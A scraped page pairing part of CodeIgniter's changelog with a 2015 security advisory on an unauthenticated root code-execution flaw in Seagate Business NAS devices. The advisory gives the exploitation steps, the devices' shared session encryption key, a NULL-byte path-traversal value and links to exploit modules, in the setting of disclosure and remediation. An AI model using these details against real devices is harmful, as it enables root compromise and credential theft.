* Fixed a bug (#3003) in the Encryption Library to support modes other than MCRYPT\_MODE\_ECB
* Fixed a bug (#3015) in the [User Agent library](./libraries/user_agent.html) where more then 2 languages where not reported with languages().
* Fixed a bug (#3017) in the [Email](./libraries/email.html) library where some timezones were calculated incorrectly.
* Fixed a bug (#3024) in which master\_dim wasn't getting reset by clear() in the Image library.
* Fixed a bug (#3156) in Text Helper highlight\_code() causing PHP tags to be handled incorrectly.
* Fixed a bug (#3166) that prevented num\_rows from working in Oracle.
* Fixed a bug (#3175) preventing certain libraries from working properly when autoloaded in PHP 4.
* Fixed a bug (#3267) in the Typography Helper where unordered list was listed "un.
* Fixed a bug (#3268) where the Router could leave '/' as the path.
* Fixed a bug (#3279) where the Email class was sending the wrong Content-Transfer-Encoding for some character sets.
* Fixed a bug (#3284) where the rsegment array would not be set properly if the requested URI contained more segments than the routed URI.
* Removed extraneous load of $CFG in \_display\_cache() of the Output class (#3285).
* Removed an extraneous call to loading models (#3286).
* Fixed a bug (#3310) with sanitization of globals in the Input class that could unset CI's global variables.
* Fixed a bug (#3314) which would cause the top level path to be deleted in delete\_files() of the File helper.
* Fixed a bug (#3328) where the smiley helper might return an undefined variable.
* Fixed a bug (#3330) in the FTP class where a comparison wasn't getting made.
* Removed an unused parameter from Profiler (#3332).
* Fixed a bug in database driver where num\_rows property wasn't getting updated.
* Fixed a bug in the [upload library](./libraries/file_uploading.html) when allowed\_files wasn't defined.
* Fixed a bug in `word_wrap()` of the Text Helper that incorrectly referenced an object.
* Fixed a bug in Validation where `valid_ip()` wasn't called properly.
* Fixed a bug in Validation where individual error messages for checkboxes wasn't supported.
* Fixed a bug in captcha calling an invalid PHP function.
* Fixed a bug in the cookie helper "set\_cookie" function. It was not honoring the config settings.
* Fixed a bug that was making validation callbacks required even when not set as such.
* Fixed a bug in the XML-RPC library so if a type is specified, a more intelligent decision is made as to the default type.
* Fixed an example of comma-separated emails in the email library documentation.
* Fixed an example in the Calendar library for Showing Next/Previous Month Links.
* Fixed a typo in the database language file.
* Fixed a typo in the image language file "suppor" to "support".
* Fixed an example for XML RPC.
* Fixed an example of `accept_charset()` in the [User Agent Library](./libraries/user_agent.html).
* Fixed a typo in the docblock comments that had CodeIgniter spelled CodeIgnitor.
* Fixed a typo in the [String Helper](./helpers/string_helper.html) (uniquid changed to uniqid).
* Fixed typos in the email Language class (email\_attachment\_unredable, email\_filed\_smtp\_login), and FTP Class (ftp\_unable\_to\_remame).
* Added a stripslashes() into the Upload Library.
* Fixed a series of grammatical and spelling errors in the language files.
* Fixed assorted user guide typos.

## Version 1.5.4

Release Date: July 12, 2007

* Added [custom Language files](./libraries/language.html) to the [autoload](./general/autoloader.html) options.
* Added stripslashes() to the \_clean\_input\_data() function in the [Input class](./libraries/input.html) when magic quotes is on so that data will always be un-slashed within the framework.
* Added array to string into the [profiler](general/profiling.html).
* Added some additional mime types in application/config/mimes.php.
* Added filename\_security() method to [Input library](./libraries/input.html).
* Added some additional arguments to the [Inflection helper](./helpers/inflector_helper.html) singular() to compensate for words ending in "s". Also added a force parameter to pluralize().
* Added $config['charset'] to the config file. Default value is 'UTF-8', used in some string handling functions.
* Fixed MSSQL insert\_id().
* Fixed a logic error in the DB trans\_status() function. It was incorrectly returning TRUE on failure and FALSE on success.
* Fixed a bug that was allowing multiple load attempts on extended classes.
* Fixed a bug in the bootstrap file that was incorrectly attempting to discern the full server path even when it was explicity set by the user.
* Fixed a bug in the escape\_str() function in the MySQL driver.
* Fixed a typo in the [Calendar library](./libraries/calendar.html)
* Fixed a typo in rpcs.php library
* Fixed a bug in the [Zip library](./libraries/zip.html), providing PC Zip file compatibility with Mac OS X
* Fixed a bug in router that was ignoring the scaffolding route for optimization
* Fixed an IP validation bug.
* Fixed a bug in display of POST keys in the [Profiler](./general/profiling.html) output
* Fixed a bug in display of queries with characters that would be interpreted as HTML in the [Profiler](./general/profiling.html) output
* Fixed a bug in display of Email class print debugger with characters that would be interpreted as HTML in the debugging output
* Fixed a bug in the Content-Transfer-Encoding of HTML emails with the quoted-printable MIME type
* Fixed a bug where one could unset certain PHP superglobals by setting them via GET or POST data
* Fixed an undefined function error in the insert\_id() function of the PostgreSQL driver
* Fixed various doc typos.
* Documented two functions from the [String helper](./helpers/string_helper.html)  that were missing from the user guide: trim\_slashes() and reduce\_double\_slashes().
* Docs now validate to XHTML 1 transitional
* Updated the XSS Filtering to take into account the IE expression() ability and improved certain deletions to prevent possible exploits
* Modified the Router so that when Query Strings are Enabled, the controller trigger and function trigger values are sanitized for filename include security.
* Modified the is\_image() method in the Upload library to take into account Windows IE 6/7 eccentricities when dealing with MIMEs
* Modified XSS Cleaning routine to be more performance friendly and compatible with PHP 5.2's new PCRE backtrack and recursion limits.
* Modified the [URL Helper](./helpers/url_helper.html) to type cast the $title as a string in case a numeric value is supplied
* Modified Form Helper form\_dropdown() to type cast the keys and values of the options array as strings, allowing numeric values to be properly set as 'selected'
* Deprecated the use if `is_numeric()` in various places since it allows periods. Due to compatibility problems with `ctype_digit()`, making it unreliable in some installations, the following regular expression was used instead: `preg_match("/[^0-9]/", $n)`
* Deprecated: APPVER has been deprecated and replaced with CI\_VERSION for clarity.

## Version 1.5.3

Release Date: April 15, 2007

* Added array to string into the profiler
* Code Igniter references updated to CodeIgniter
* pMachine references updated to EllisLab
* Fixed a bug in the repeater function of [string helper](./helpers/string_helper.html).
* Fixed a bug in ODBC driver
* Fixed a bug in result\_array() that was returning an empty array when no result is produced.
* Fixed a bug in the redirect function of the [url helper](./helpers/url_helper.html).
* Fixed an undefined variable in Loader
* Fixed a version bug in the Postgres driver
* Fixed a bug in the textarea function of the form helper for use with strings
* Fixed doc typos.

## Version 1.5.2

Release Date: February 13, 2007

* Added [subversion information](./installation/downloads.html#svn) to the [downloads](./installation/downloads.html) page.
* Added support for captions in the [Table Library](./libraries/table.html)
* Fixed a bug in the [download\_helper](./helpers/download_helper.html) that was causing Internet Explorer to load rather than download
* Fixed a bug in the Active Record Join function that was not taking table prefixes into consideration.
* Removed unescaped variables in error messages of Input and Router classes
* Fixed a bug in the Loader that was causing errors on Libraries loaded twice. A debug message is now silently made in the log.
* Fixed a bug in the [form helper](./helpers/form_helper.html) that gave textarea a value attribute
* Fixed a bug in the [Image Library](./libraries/image_lib.php) that was ignoring resizing the same size image
* Fixed some doc typos.

## Version 1.5.1

Release Date: November 23, 2006

* Added support for submitting arrays of libraries in the $this->load->library function.
* Added support for naming custom library files in lower or uppercase.
* Fixed a bug related to output buffering.
* Fixed a bug in the active record class that was not resetting query data after a completed query.
* Fixed a bug that was suppressing errors in controllers.
* Fixed a problem that can cause a loop to occur when the config file is missing.
* Fixed a bug that occurred when multiple models were loaded with the third parameter set to TRUE.
* Fixed an oversight that was not unsetting globals properly in the input sanitize function.
* Fixed some bugs in the Oracle DB driver.
* Fixed an incorrectly named variable in the MySQLi result driver.
* Fixed some doc typos.

## Version 1.5.0.1

Release Date: October 31, 2006

* Fixed a problem in which duplicate attempts to load helpers and classes were not being stopped.
* Fixed a bug in the word\_wrap() helper function.
* Fixed an invalid color Hex number in the Profiler class.
* Fixed a corrupted image in the user guide.

## Version 1.5.0

Release Date: October 30, 2006

* Added [DB utility class](./database/utilities.html), permitting DB backups, CVS or XML files from DB results, and various other functions.
* Added [Database Caching Class](./database/caching.html).
* Added [transaction support](./database/transactions.html) to the database classes.
* Added [Profiler Class](./general/profiling.html) which generates a report of Benchmark execution times, queries, and POST data at the bottom of your pages.
* Added [User Agent Library](./libraries/user_agent.html) which allows browsers, robots, and mobile devises to be identified.
* Added [HTML Table Class](./libraries/table.html) , enabling tables to be generated from arrays or database results.
* Added [Zip Encoding Library](./libraries/zip.html).
* Added [FTP Library](./libraries/ftp.html).
* Added the ability to [extend libraries](./general/creating_libraries.html) and [extend core classes](./general/core_classes.html), in addition to being able to replace them.
* Added support for storing [models within sub-folders](./general/models.html).
* Added [Download Helper](./helpers/download_helper.html).
* Added [simple\_query()](./database/queries.html) function to the database classes
* Added [standard\_date()](./helpers/date_helper.html) function to the Date Helper.
* Added [$query->free\_result()](./database/results.html) to database class.
* Added [$query->list\_fields()](./database/fields.html) function to database class
* Added [$this->db->platform()](./database/helpers.html) function
* Added new [File Helper](./helpers/file_helper.html): get\_filenames()
* Added new helper: [Smiley Helper](./helpers/smiley_helper.html)
* Added support for <ul> and <ol> lists in the [HTML Helper](./helpers/html_helper.html)
* Added the ability to rewrite [short tags](./general/alternative_php.html) on-the-fly, converting them to standard PHP statements, for those servers that do not support short tags. This allows the cleaner syntax to be used regardless of whether it's supported by the server.
* Added the ability to [rename or relocate the "application" folder](./general/managing_apps.html).
* Added more thorough initialization in the upload class so that all class variables are reset.
* Added "is\_numeric" to validation, which uses the native PHP is\_numeric function.
* Improved the URI handler to make it more reliable when the $config['uri\_protocol'] item is set to AUTO.
* Moved most of the functions in the Controller class into the Loader class, allowing fewer reserved function names for controllers when running under PHP 5.
* Updated the DB Result class to return an empty array when $query->result() doesn't produce a result.
* Updated the input->cookie() and input->post() functions in [Input Class](./libraries/input.html) to permit arrays contained cookies that are arrays to be run through the XSS filter.
* Documented three functions from the [Validation class](./libraries/validation.html) that were missing from the user guide: set\_select(), set\_radio(), and set\_checkbox().
* Fixed a bug in the Email class related to SMTP Helo data.
* Fixed a bug in the word wrapping helper and function in the email class.
* Fixed a bug in the validation class.
* Fixed a bug in the typography helper that was incorrectly wrapping block level elements in paragraph tags.
* Fixed a problem in the form\_prep() function that was double encoding entities.
* Fixed a bug that affects some versions of PHP when output buffering is nested.
* Fixed a bug that caused CI to stop working when the PHP magic \_\_get() or \_\_set() functions were used within models or controllers.
* Fixed a pagination bug that was permitting negative values in the URL.
* Fixed an oversight in which the Loader class was not allowed to be extended.
* Changed \_get\_config() to get\_config() since the function is not a private one.
* **Deprecated "init" folder**. Initialization happens automatically now. [Please see documentation](./general/creating_libraries.html).
* **Deprecated** $this->db->field\_names() USE $this->db->list\_fields()
* **Deprecated** the $config['log\_errors'] item from the config.php file. Instead, $config['log\_threshold'] can be set to "0" to turn it off.

## Version 1.4.1

Release Date: September 21, 2006

* Added a new feature that passes URI segments directly to your function calls as parameters. See the [Controllers](./general/controllers.html) page for more info.
* Added support for a function named \_output(), which when used in your controllers will received the final rendered output from the output class. More info in the [Controllers](controllers.html) page.
* Added several new functions in the [URI Class](./libraries/uri.html) to let you retrieve and manipulate URI segments that have been re-routed using the [URI Routing](routing.html) feature. Previously, the URI class did not permit you to access any re-routed URI segments, but now it does.
* Added [$this->output->set\_header()](./libraries/output.html) function, which allows you to set server headers.
* Updated plugins, helpers, and language classes to allow your application folder to contain its own plugins, helpers, and language folders. Previously they were always treated as global for your entire installation. If your application folder contains any of these resources they will be used *instead* the global ones.
* Added [Inflector helper](./helpers/inflector_helper.html).
* Added element() function in the [array helper](./helpers/array_helper.html).
* Added RAND() to active record orderby() function.
* Added delete\_cookie() and get\_cookie() to [Cookie helper](./helpers/cookie_helper.html), even though the input class has a cookie fetching function.
* Added Oracle database driver (still undergoing testing so it might have some bugs).
* Added the ability to combine pseudo-variables and php variables in the template parser class.
* Added output compression option to the config file.
* Removed the is\_numeric test from the db->escape() function.
* Fixed a MySQLi bug that was causing error messages not to contain proper error data.
* Fixed a bug in the email class which was causing it to ignore explicitly set alternative headers.
* Fixed a bug that was causing a PHP error when the Exceptions class was called within the get\_config() function since it was causing problems.
* Fixed an oversight in the cookie helper in which the config file cookie settings were not being honored.
* Fixed an oversight in the upload class. An item mentioned in the 1.4 changelog was missing.
* Added some code to allow email attachments to be reset when sending batches of email.
* Deprecated the application/scripts folder. It will continue to work for legacy users, but it is recommended that you create your own
  [libraries](./general/libraries.html) or [models](./general/models.html) instead. It was originally added before CI had user libraries or models, but it's not needed anymore.
* Deprecated the $autoload['core'] item from the `autoload.php` file. Instead, please now use: `$autoload['libraries']`
* Deprecated the following database functions: $this->db->smart\_escape\_str() and $this->db->fields().

## Version 1.4.0

Release Date: September 17, 2006

* Added [Hooks](./general/hooks.html) feature, enabling you to tap into and modify the inner workings of the framework without hacking the core files.
* Added the ability to organize controller files [into sub-folders](./general/controllers.html). Kudos to Marco for suggesting this (and the next two) feature.
* Added regular expressions support for [routing rules](./general/routing.html).
* Added the ability to [remap function calls](./general/controllers.html) within your controllers.
* Added the ability to [replace core system classes](./general/core_classes.html) with your own classes.
* Added support for % character in URL.
* Added the ability to supply full URLs using the [anchor()](./helpers/url_helper.html) helper function.
* Added mode parameter to [file\_write()](./helpers/file_helper.html) helper.
* Added support for changing the port number in the [Postgres driver](./database/configuration.html).
* Moved the list of "allowed URI characters" out of the Router class and into the config file.
* Moved the MIME type array out of the Upload class and into its own file in the applications/config/ folder.
* Updated the Upload class to allow the upload field name to be set when calling [do\_upload()](./libraries/file_uploading.html).
* Updated the [Config Library](./libraries/config.html) to be able to load config files silently, and to be able to assign config files to their own index (to avoid collisions if you use multiple config files).
* Updated the URI Protocol code to allow more options so that URLs will work more reliably in different environments.
* Updated the form\_open() helper to allow the GET method to be used.
* Updated the MySQLi execute() function with some code to help prevent lost connection errors.
* Updated the SQLite Driver to check for object support before attempting to return results as objects. If unsupported it returns an array.
* Updated the Models loader function to allow multiple loads of the same model.
* Updated the MS SQL driver so that single quotes are escaped.
* Updated the Postgres and ODBC drivers for better compatibility.
* Removed a strtolower() call that was changing URL segments to lower case.
* Removed some references that were interfering with PHP 4.4.1 compatibility.
* Removed backticks from Postgres class since these are not needed.
* Renamed display() to \_display() in the Output class to make it clear that it's a private function.
* Deprecated the hash() function due to a naming conflict with a native PHP function with the same name. Please use `dohash()` instead.
* Fixed an bug that was preventing the input class from unsetting GET variables.
* Fixed a router bug that was making it too greedy when matching end segments.
* Fixed a bug that was preventing multiple discrete database calls.
* Fixed a bug in which loading a language file was producing a "file contains no data" message.
* Fixed a session bug caused by the XSS Filtering feature inadvertently changing the case of certain words.
* Fixed some missing prefixes when using the database prefix feature.
* Fixed a typo in the Calendar class (cal\_november).
* Fixed a bug in the form\_checkbox() helper.
* Fixed a bug that was allowing the second segment of the URI to be identical to the class name.
* Fixed an evaluation bug in the database initialization function.
* Fixed a minor bug in one of the error messages in the language class.
* Fixed a bug in the date helper timespan function.
* Fixed an undefined variable in the DB Driver class.
* Fixed a bug in which dollar signs used as binding replacement values in the DB class would be treated as RegEx back-references.
* Fixed a bug in the set\_hash() function which was preventing MD5 from being used.
* Fixed a couple bugs in the Unit Testing class.
* Fixed an incorrectly named variable in the Validation class.
* Fixed an incorrectly named variable in the URI class.
* Fixed a bug in the config class that was preventing the base URL from being called properly.
* Fixed a bug in the validation class that was not permitting callbacks if the form field was empty.
* Fixed a problem that was preventing scaffolding from working properly with MySQLi.
* Fixed some MS SQL bugs.
* Fixed some doc typos.

## Version 1.3.3

Release Date: June 1, 2006

* Models do **not** connect automatically to the database as of this version. [More info here](./general/models.html).
* Updated the Sessions class to utilize the active record class when running session related queries. Previously the queries assumed MySQL syntax.
* Updated alternator() function to re-initialize when called with no arguments, allowing multiple calls.
* Fixed a bug in the active record "having" function.
* Fixed a problem in the validation class which was making checkboxes be ignored when required.
* Fixed a bug in the word\_limiter() helper function. It was cutting off the fist word.
* Fixed a bug in the xss\_clean function due to a PHP bug that affects some versions of html\_entity\_decode.
* Fixed a validation bug that was preventing rules from being set twice in one controller.
* Fixed a calendar bug that was not letting it use dynamically loaded languages.
* Fixed a bug in the active record class when using WHERE clauses with LIKE
* Fixed a bug in the hash() security helper.
* Fixed some typos.

## Version 1.3.2

Release Date: April 17, 2006

* Changed the behavior of the validation class such that if a "required" rule is NOT explicitly stated for a field then all other tests get ignored.
* Fixed a bug in the Controller class that was causing it to look in the local "init" folder instead of the main system one.
* Fixed a bug in the init\_pagination file. The $config item was not being set correctly.
* Fixed a bug in the auto typography helper that was causing inconsistent behavior.
* Fixed a couple bugs in the Model class.
* Fixed some documentation typos and errata.

## Version 1.3.1

Release Date: April 11, 2006

* Added a [Unit Testing Library](./libraries/unit_testing.html).
* Added the ability to pass objects to the **insert()** and **update()** database functions.
  This feature enables you to (among other things) use your [Model class](./general/models.html) variables to run queries with. See the Models page for details.
* Added the ability to pass objects to the [view loading function](./general/views.html): $this->load->view('my\_view', $object);
* Added `getwhere` function to [Active Record class](./database/active_record.html).
* Added `count_all` function to [Active Record class](./database/active_record.html).
* Added language file for scaffolding and fixed a scaffolding bug that occurs when there are no rows in the specified table.
* Added [$this->db->last\_query()](./database/queries.html), which allows you to view your last query that was run.
* Added a new mime type to the upload class for better compatibility.
* Changed how cache files are read to prevent PHP errors if the cache file contains an XML tag, which PHP wants to interpret as a short tag.
* Fixed a bug in a couple of the active record functions (where and orderby).
* Fixed a bug in the image library when realpath() returns false.
* Fixed a bug in the Models that was preventing libraries from being used within them.
* Fixed a bug in the "exact\_length" function of the validation class.
* Fixed some typos in the user guide

## Version 1.3

Release Date: April 3, 2006

* Added support for [Models](models.html).
* Redesigned the database libraries to support additional RDBMs (Postgres, MySQLi, etc.).
* Redesigned the [Active Record class](./database/active_record.html) to enable more varied types of queries with simpler syntax, and advanced features like JOINs.
* Added a feature to the database class that lets you run [custom function calls](./database/call_function.html).
* Added support for [private functions](controllers.html) in your controllers. Any controller function name that starts with an underscore will not be served by a URI request.
* Added the ability to pass your own initialization parameters to your [custom core libraries](creating_libraries.html) when using $this->load->library()
* Added support for running standard [query string URLs](urls.html). These can be optionally enabled in your config file.
* Added the ability to [specify a "suffix"](urls.html), which will be appended to your URLs. For example, you could add .html to your URLs, making them appear static. This feature is enabled in your config file.
* Added a new error template for use with native PHP errors.
* Added "alternator" function in the [string helpers](./helpers/string_helper.html).
* Removed slashing from the input class. After much debate we decided to kill this feature.
* Change the commenting style in the scripts to the PEAR standard so that IDEs and tools like phpDocumenter can harvest the comments.
* Added better class and function name-spacing to avoid collisions with user developed classes. All CodeIgniter classes are now prefixed with CI\_ and
  all controller methods are prefixed with \_ci to avoid controller collisions. A list of reserved function names can be [found here](controllers.html).
* Redesigned how the "CI" super object is referenced, depending on whether PHP 4 or 5 is being run, since PHP 5 allows a more graceful way to manage objects that utilizes a bit less resources.
* Deprecated: $this->db->use\_table() has been deprecated. Please read the [Active Record](./database/active_record.html) page for information.
* Deprecated: $this->db->smart\_escape\_str() has been deprecated. Please use this instead: $this->db->escape()
* Fixed a bug in the exception handler which was preventing some PHP errors from showing up.
* Fixed a typo in the URI class. $this->total\_segment() should be plural: $this->total\_segments()
* Fixed some typos in the default calendar template
* Fixed some typos in the user guide

## Version 1.2

Release Date: March 21, 2006

* Redesigned some internal aspects of the framework to resolve scoping problems that surfaced during the beta tests. The problem was most notable when instantiating classes in your constructors, particularly if those classes in turn did work in their constructors.
* Added a global function named [get\_instance()](ancillary_classes.html) allowing the main CodeIgniter object to be accessible throughout your own classes.
* Added new [File Helper](./helpers/file_helper.html): delete\_files()
* Added new [URL Helpers](./helpers/url_helper.html): base\_url(), index\_page()
* Added the ability to create your own [core libraries](creating_libraries.html) and store them in your local application directory.
* Added an `overwrite` option to the [Upload class](./libraries/file_uploading.html), enabling files to be overwritten rather than having the file name appended.
* Added Javascript Calendar plugin.
* Added search feature to user guide. Note: This is done using Google, which at the time of this writing has not crawled all the pages of the docs.
* Updated the parser class so that it allows tag pars within other tag pairs.
* Fixed a bug in the DB "where" function.
* Fixed a bug that was preventing custom config files to be auto-loaded.
* Fixed a bug in the mysql class bind feature that prevented question marks in the replacement data.
* Fixed some bugs in the xss\_clean function

## Version Beta 1.1

Release Date: March 10, 2006

* Added a [Calendaring class](./libraries/calendar.html).
* Added support for running [multiple applications](managing_apps.html) that share a common CodeIgniter backend.
* Moved the "uri protocol" variable from the index.php file into the config.php file
* Fixed a problem that was preventing certain function calls from working within constructors.
* Fixed a problem that was preventing the $this->load->library function from working in constructors.
* Fixed a bug that occurred when the session class was loaded using the auto-load routine.
* Fixed a bug that can happen with PHP versions that do not support the E\_STRICT constant
* Fixed a data type error in the form\_radio function (form helper)
* Fixed a bug that was preventing the xss\_clean function from being called from the validation class.
* Fixed the cookie related config names, which were incorrectly specified as $conf rather than $config
* Fixed a pagination problem in the scaffolding.
* Fixed a bug in the mysql class "where" function.
* Fixed a regex problem in some code that trimmed duplicate slashes.
* Fixed a bug in the br() function in the HTML helper
* Fixed a syntax mistake in the form\_dropdown function in the Form Helper.
* Removed the "style" attributes form the form helpers.
* Updated the documentation. Added "next/previous" links to each page and fixed various typos.

## Version Beta 1.0

Release Date: February 28, 2006

First publicly released version.

Previous Topic:  [License Agreement](license.html)
   ·
[Top of Page](#top)   ·
[User Guide Home](index.html)   ·
Next Topic:  [Credits](./general/credits.html)

[CodeIgniter](https://codeigniter.com)  ·  Copyright © 2006 - 2014  ·  [EllisLab, Inc.](http://ellislab.com/)  ·  Copyright © 2014 - 2015  ·  [British Columbia Institute of Technology](http://bcit.ca/)



=== Content from beyondbinary.io_77cf7451_20250126_004959.html ===

[![](/images/beyond-binary-logo.png)](/)

* [home](/)
* [about](/about/)
* [services](/services/)
* [articles](/articles/)
* [contact](/contact/)
* [media](/media/)

![](/images/sticky-morph.png)

## Articles & News

1 March 2015
# Advisory: Seagate NAS Remote Code Execution Vulnerability

[Advisory](/tags/advisory/)
[CVE](/tags/cve/)
[Exploit](/tags/exploit/)
[Seagate](/tags/seagate/)
## Overview

[Seagate](http://www.seagate.com/) is a well-known vendor of hardware solutions, with products available worldwide. Its line of [NAS](https://en.wikipedia.org/wiki/Network-attached_storage) products targeted at businesses is called [Business Storage 2-Bay NAS](http://www.seagate.com/au/en/support/external-hard-drives/network-storage/business-storage-2-bay-nas/). These can be found inside home and business networks, and in many cases they are publicly exposed.

Products in this line that run firmware versions up to and including version 2014.00319 were found to be vulnerable to a number of issues that allow for remote code execution under the context of the root user. These vulnerabilities are exploitable without requiring any form of authorisation on the device.

## Updates

This document was updated on 11th June 2015 to include links to the released firmware that attempts to address the issues in this advisory.

## Vulnerability Details

Seagate Business NAS products come with a web-enabled management application. This application lets administrators perform the usual device configuration functions, such as adding users, setting up access control, managing files, and more.

The web application is built with the following core technologies:

* PHP version 5.2.13 ([Released 25th February 2010](http://php.net/releases/5_2_13.php))
* CodeIgniter 2.1.0 ([Released 23rd November 2011](https://github.com/bcit-ci/CodeIgniter/releases/tag/v2.1.0))
* Lighttpd 1.4.28 ([Released 22nd August 2010](http://redmine.lighttpd.net/projects/lighttpd/wiki/Release-1_4_28))

All three of these technologies are clearly out of date, and the listed versions of PHP and CodeIgniter are known to have security issues. On top of these technologies sits a custom PHP application, which itself contains a number of security-related issues. Details of each key issue are listed below.

### PHP 5.2.3

Versions of PHP prior to 5.3.4 allow users to specify file paths that include a NULL byte ([CVE-2006-7243](http://www.cvedetails.com/cve/CVE-2006-7243/)). This issue allows user-controlled data to prematurely terminate file paths, allowing for full control over the file extension.

This issue is regularly abused to include unintended files in PHP source code via functions such as `require()` and `include()`.

### CodeIgniter 2.1.0

Versions of CodeIgniter prior to 2.2.0 create session tokens that are made up of a serialised PHP associative array (hash) that has been encrypted using a custom algorithm. This PHP hash contains user-controllable data, which makes it possible for users to [extract the encryption key](https://www.mehmetince.net/codeigniter-object-injection-vulnerability-via-encryption-key/) and decrypt the content of the cookie ([CVE-2014-8686](https://www.dionach.com/blog/codeigniter-session-decoding-vulnerability)). Once decrypted, users can modify the content of the cookie and re-encrypt it prior to submitting it back to the server, resulting in other potential attack vectors including PHP object injection.

A unique encryption key value should be used for each installation of a CodeIgniter application. However, in the case of this line of NAS products, the encryption key that is used is exactly the same for every instance ([CVE-2014-8687](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-8687)).

### Custom web application

The custom web application does not appear to maintain session-related information on the web server side. All of the information relevant to a user session is stored inside the session cookie prior to it being encrypted and sent to the browser. The PHP hash inside the cookie contains a number of key/value entries, including the following:

* `username`: this is a string value that represents the name of the user in the current session.
* `is_admin`: this is a string value that can be set to `yes` or `no`, and indicates whether the current user is an administrator on the NAS.
* `language`: this is a string value that represents the current user’s chosen language (eg. `en_US`).

Once a session has been established and the `username` field is present in the cookie, the system does no further validation of user credentials. This means that if a user can manipulate this value directly, instead of attempting to log in the standard way, they can bypass the login mechanism completely.

Direct modification (or addition) of the `is_admin` value allows a user to self-elevate to administrative privileges in the web application itself.

The fact that a static session encryption key is in use across all instances of the NAS means that once a user has a valid session cookie on one instance, they can apply that same cookie directly to another instance and acquire the same level of access. In short, once a user is logged in as `admin` on one instance, they’re effectively `admin` on every instance.

The `language` parameter is used to generate a file path that is referenced in the web application PHP code via a call to `include()`. Manipulation of this parameter allows for exploitation of a local file inclusion vulnerability.

Finally, the web application is being served by an instance of Lighttpd that is running under the context of the `root` user. Hence, any successful exploitation results in activities being conducted as `root`.

## Affected versions

Two versions of the NAS firmware were tested and shown to be vulnerable. Those versions were:

* 2014.00319
* 2013.60311

At the time of writing, it is believed that all versions prior to 2014.00319 are highly likely to contain the same vulnerabilities.

## CVE Identifiers

This advisory makes use of prior work referenced in the following CVEs:

* [CVE-2014-8684](http://seclists.org/fulldisclosure/2014/May/54): timing attacks and object injection.
* [CVE-2014-8686](https://www.dionach.com/blog/codeigniter-session-decoding-vulnerability): a fall-back to the `_xor_encode()` method of session encryption.

The vulnerability discovered via the reuse of the session cookie encryption key was allocated the identifier [CVE-2014-8687](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-8687) by MITRE.

## Exploitation

It is simple to exploit the issues listed above to gain arbitrary code execution on the device as the `root` user. The key steps required to achieve this are:

* The attacker must write PHP code to the file system on the NAS. This can be done in several ways, including:
  1. HTTP access log file poisoning via the `User-Agent` header.
  2. HTTP error log file poisoning via the `Host` header.
  3. Modifying the device description in the web application interface. This writes user-controlled strings to a file located at `/etc/devicedesc`, however it does require administrative rights.
  4. Uploading of files to a file share that the device has exposed.
* The attacker must then manipulate the content of the `language` variable in the session cookie so that it contains the path to the attacker-controlled PHP on the file system. The NULL byte flaw in PHP must be used at the end of this value to force PHP to ignore any characters that are appended to the file path by the web application.
* The attacker then makes a request with the manipulated cookie, resulting in code execution as `root`.

Beyond Binary has produced a Metasploit module and a standalone Python script that automate the process of exploitation. Each of these scripts take the following approach:

1. Connects to the target NAS and extracts a `ci_session` cookie.
2. Decrypts the cookie using the static encryption key of `0f0a000d02011f0248000d290d0b0b0e03010e07` and extracts the PHP hash.
3. Modifies the serialised PHP hash so that the `username` is set to `admin` and the `is_admin` field is set to `yes`.
4. Encrypts this updated PHP hash ready for further use as a `ci_session` cookie. This cookie now allows future requests to operate on the NAS as if they were an administrator.
5. Performs a request to extract the host configuration, which includes the device’s description.
6. Modifies the host configuration so that the device description contains a small stager payload.
7. Performs a request to update the host configuration with the new data so that the stager payload is written to `/etc/devicedesc`.
8. Modifies the PHP hash again so that the `language` parameter contains the value `../../../../etc/devicedesc\x00` (note the NULL byte at the end).
9. Encrypts this new PHP hash ready for future use as a `ci_session` cookie.
10. Performs a request to the NAS using the cookie created in the previous step. This invokes the stager that was written to disk. This request posts a larger payload which is written to disk under the web server root.
11. Performs another request which then resets the host configuration back to what it was prior to exploitation.

From here, the final stage of the exploit is on-disk and ready to be executed. In the case of the Metasploit module, the final stage is a self-deleting file that contains whichever payload was chosen by the user. In the case of the standalone Python script, the final stage is a simple web shell which is continually referenced for each executed command, and is removed when the Python script is closed.

The exploits are available for download here:

* [Metasploit module](/exploits/bbsec001/seagate_nas_php_exec_noauth.rb) (or on [Github](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/http/seagate_nas_php_exec_noauth.rb)).
* [Python script](/exploits/bbsec001/seagate_nas_php_exec_noauth.py) (or on [Exploit DB](http://www.exploit-db.com/exploits/36202/)).

The following image shows a sample run of the Metasploit module:

![Metasploit module sample run](/images/bbsec001/msf-sample-run.png)

## Remediation

At the time of writing there is no firmware version available for download that contains fixes for the issues listed in this advisory. It is recommended that consumers of these Seagate Business NAS products (and other products using vulnerable firmware) ensure that devices are not accessible via the public Internet. For internal use, it is recommended that the devices be located behind a firewall configured to allow only a trusted set of IP addresses to connect to the web interface.

**Edit: 11th June 2015**

During April 2015 Seagate released [firmware](http://www.seagate.com/au/en/support/downloads/item/business-nas-4bay-firmware-master-dl/) that attempts to resolve these issues. Please see the timeline below.

## Exposure

At the time of writing, [Shodan](https://www.shodan.io/) reports that there are over 2,500 publicly exposed devices on the Internet that are likely to be vulnerable.

## Potential Ramifications

It appears that the NAS products do not integrate with the likes of Active Directory or LDAP. As a result, they need to store passwords for any users that require access. Passwords are hashed using DES and stored in the `/etc/shadow` file.

Instances of the NAS housed inside an organisation are likely to contain passwords that are reused by domain users. The DES hashes are very easy to crack, and hence an attacker could easily acquire domain credentials once the NAS has been compromised.

## Notes

Initial attempts to disclose the above issues to the vendor proved time consuming and unproductive. Staff on the front-line support team repeatedly failed to direct the query to the relevant point of contact. In light of this, a direct security contact was identified using open intelligence, and front-line support was bypassed. This employee handled the query professionally and demonstrated a high level of concern in the early stages.

## Timeline

* **07th October 2014**
  + Initial bug discovery.
* **08th October 2014**
  + Simple Proof of Concept exploit created.
* **16th October 2014**
  + Enhanced exploit created.
* **18th October 2014**
  + Contacted vendor via website, requested PGP for secure communications.
  + Contacted MITRE to discuss potential CVE identifier allocation.
* **20th October 2014**
  + Contacted vendor via Twitter, requested PGP for secure communications.
  + Vendor responded via email, requested disclosure via non-encrypted channels.
* **22nd October 2014**
  + Contacted vendor via email, disclosed all details of the issues found.
  + Beyond Binary established 100 day public disclosure period ending on 30th January 2015.
* **23rd October 2014**
  + Vendor responded, confirmed receipt, requested 24 hours to confirm issues.
* **23rd October 2014**
  + Vendor responded, requested firmware version in use. Suggested using latest firmware.
  + Contacted vendor via email, informed them that all firmware versions are vulnerable.
